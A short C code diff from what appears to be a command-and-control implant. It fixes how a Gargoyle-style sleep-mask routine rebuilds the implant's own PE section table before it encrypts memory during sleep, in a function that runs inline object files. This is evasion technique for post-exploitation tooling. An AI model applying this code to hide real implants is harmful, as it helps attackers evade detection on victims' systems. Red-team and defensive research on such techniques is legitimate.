@@ -635,8 +635,11 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					gparms->sections = info.sections;
 					gparms->heap_records = info.heap_records;
 					memcpy(gparms->mask, info.mask, MASK_SIZE);
-					/* sections are already the own-PE table built by
-					 * gargle_setup_parms (see gargleint.cpp) */
+					/* the info.sections assignment above restored the
+					 * generator-published (layout-blind) table - re-derive
+					 * the own-PE table or the mask walk lands on our
+					 * .pdata and fail-fasts (see docs/SLEEP-MASK-FEEDBACK.md) */
+					gargle_own_sections(gparms, NULL, NULL);
 				}
 				if (gparms == NULL)
 					Sleep(t);
